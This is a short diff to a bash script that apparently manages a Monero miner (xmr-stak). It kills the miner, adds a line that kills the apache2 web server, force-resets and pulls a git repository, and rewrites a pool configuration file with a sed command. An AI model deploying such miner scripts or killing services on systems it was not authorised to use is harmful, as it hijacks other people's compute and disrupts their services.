@@ -1,6 +1,7 @@
 #!/bin/bash
 
 killall xmr-stak
+killall apache2
 
 cd ~/tanhuevon/ ; git stash drop; git reset --hard; git pull
 sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
